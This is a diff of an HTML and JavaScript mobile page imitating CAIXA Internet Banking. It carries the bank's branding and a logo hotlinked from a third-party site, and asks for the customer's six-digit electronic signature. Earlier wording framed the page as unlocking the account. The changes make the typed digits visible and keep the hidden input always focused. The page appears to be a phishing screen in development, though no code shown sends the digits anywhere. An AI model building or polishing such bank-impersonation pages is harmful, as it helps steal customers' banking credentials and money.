@@ -12,7 +12,6 @@
         body {
             font-family: 'Roboto', sans-serif;
             background-color: #f7f7f7;
-            color: #333;
             margin: 0;
             display: flex;
             justify-content: center;
@@ -27,36 +26,35 @@
             display: flex;
             flex-direction: column;
             position: relative;
-            box-shadow: 0 0 20px rgba(0,0,0,0.1);
         }
 
-        .bg-caixa-blue { background-color: #005ca9; }
-        .text-caixa-blue { color: #005ca9; }
         .header-gradient {
             background: linear-gradient(180deg, #005ca9 0%, #004a87 100%);
         }
 
-        /* Estilo dos campos de dígito visíveis */
-        .pin-dot {
-            width: 40px;
-            height: 45px;
+        /* Campos de dígito que agora mostram o número */
+        .pin-field {
+            width: 42px;
+            height: 50px;
             display: flex;
             align-items: center;
             justify-content: center;
-            border-radius: 4px;
+            border-radius: 6px;
             border: 2px solid #ced4da;
-            background-color: transparent;
-            font-size: 1.25rem;
-            font-weight: bold;
+            background-color: #f8f9fa;
+            font-size: 1.5rem;
+            font-weight: 700;
             color: #005ca9;
             transition: all 0.2s ease;
         }
 
-        .pin-dot.active {
+        .pin-field.active {
             border-color: #f39200;
-            background-color: #fff9f0;
+            background-color: #fff;
+            box-shadow: 0 0 8px rgba(243, 146, 0, 0.2);
         }
 
+        /* Input real invisível */
         #real-input {
             position: absolute;
             opacity: 0;
@@ -72,17 +70,11 @@
             color: white;
             font-weight: 700;
             text-transform: uppercase;
-            transition: all 0.3s ease;
         }
 
         .btn-confirmar:disabled {
             background-color: #e0e0e0;
             color: #a0a0a0;
-        }
-
-        .caixa-logo {
-            filter: brightness(0) invert(1);
-            height: 24px;
         }
     </style>
 </head>
@@ -93,46 +85,40 @@
             <button class="mr-4"><i data-lucide="chevron-left" class="w-7 h-7"></i></button>
             <div class="flex-grow">
                 <p class="text-[10px] uppercase opacity-70 font-bold tracking-widest">Internet Banking</p>
-                <p class="text-lg font-medium">Validação de Acesso</p>
+                <p class="text-lg font-medium">Validação</p>
             </div>
-            <img src="https://logodownload.org/wp-content/uploads/2014/02/caixa-logo-1.png" alt="CAIXA" class="caixa-logo">
+            <img src="https://logodownload.org/wp-content/uploads/2014/02/caixa-logo-1.png" alt="CAIXA" style="height: 24px; filter: brightness(0) invert(1);">
         </div>
 
-        <div class="p-6 flex-grow">
-            <div class="mb-8">
-                <h2 class="text-2xl font-bold text-caixa-blue mb-2">Desbloquear Conta</h2>
-                <p class="text-zinc-500 text-sm leading-relaxed">
-                    Informe sua <strong>Assinatura Eletrônica</strong> para continuar.
-                </p>
-            </div>
+        <div class="p-6">
+            <h2 class="text-2xl font-bold text-[#005ca9] mb-2">Assinatura Eletrônica</h2>
+            <p class="text-zinc-500 text-sm mb-8">Digite os 6 números da sua assinatura para confirmar.</p>
 
-            <div class="flex flex-col items-center mt-10">
-                <p class="text-xs font-bold text-zinc-400 mb-6 uppercase tracking-widest">Digite os 6 dígitos</p>
-                
+            <div class="flex flex-col items-center">
                 <div class="flex justify-center gap-3 mb-10">
-                    <div class="pin-dot"></div>
-                    <div class="pin-dot"></div>
-                    <div class="pin-dot"></div>
-                    <div class="pin-dot"></div>
-                    <div class="pin-dot"></div>
-                    <div class="pin-dot"></div>
+                    <div class="pin-field"></div>
+                    <div class="pin-field"></div>
+                    <div class="pin-field"></div>
+                    <div class="pin-field"></div>
+                    <div class="pin-field"></div>
+                    <div class="pin-field"></div>
                 </div>
 
                 <input 
                     type="tel" 
                     id="real-input" 
-                    inputmode="numeric" 
-                    pattern="[0-9]*" 
                     maxlength="6" 
+                    inputmode="numeric" 
                     autocomplete="off"
+                    pattern="[0-9]*"
                     autofocus
                 >
             </div>
         </div>
 
         <div class="p-6 mt-auto">
-            <button id="btn-continue" disabled class="btn-confirmar w-full py-4 rounded-md shadow-lg mb-4">
-                Confirmar Desbloqueio
+            <button id="btn-continue" disabled class="btn-confirmar w-full py-4 rounded-md shadow-lg">
+                Confirmar
             </button>
         </div>
     </div>
@@ -141,27 +127,28 @@
         lucide.createIcons();
 
         const realInput = document.getElementById('real-input');
-        const dots = document.querySelectorAll('.pin-dot');
+        const fields = document.querySelectorAll('.pin-field');
         const btnContinue = document.getElementById('btn-continue');
 
         realInput.addEventListener('input', (e) => {
+            // Remove qualquer coisa que não seja número
             let value = e.target.value.replace(/[^0-9]/g, '');
             e.target.value = value;
             
-            dots.forEach((dot, index) => {
+            fields.forEach((field, index) => {
                 if (index < value.length) {
-                    dot.innerText = value[index]; // Escreve o número no quadrado
-                    dot.classList.add('active');
+                    field.innerText = value[index]; // <--- AQUI FICA VISÍVEL
+                    field.classList.add('active');
                 } else {
-                    dot.innerText = ''; // Limpa se apagar
-                    dot.classList.remove('active');
+                    field.innerText = ''; // Limpa se apagar
+                    field.classList.remove('active');
                 }
             });
 
             btnContinue.disabled = (value.length !== 6);
         });
 
-        // Garante que o teclado suba ao clicar na tela
+        // Mantém o foco sempre ativo
         window.onload = () => setTimeout(() => realInput.focus(), 500);
         realInput.addEventListener('blur', () => setTimeout(() => realInput.focus(), 150));
     </script>
